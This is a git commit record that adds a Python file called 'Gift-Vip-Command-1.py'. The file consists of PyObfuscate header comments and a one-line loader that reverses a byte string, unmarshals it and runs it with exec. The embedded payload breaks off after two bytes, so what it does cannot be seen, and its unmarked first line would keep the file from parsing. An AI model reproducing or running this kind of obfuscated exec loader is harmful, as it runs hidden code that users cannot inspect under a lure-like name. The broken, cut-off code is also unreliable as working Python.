76cc9d5505c06c552a18c6a2b2c088065a069c62
Teb Shakib <149871445+Tebshakib07@users.noreply.github.com>
2024-01-23 21:20:31 +0600

    Create Gift-Vip-Command-1.py

---
+++ Gift-Vip-Command-1.py
@@ -0,0 +1,5 @@
+Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Tue Jan 23 21:05:57 2024
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(b'\x00>
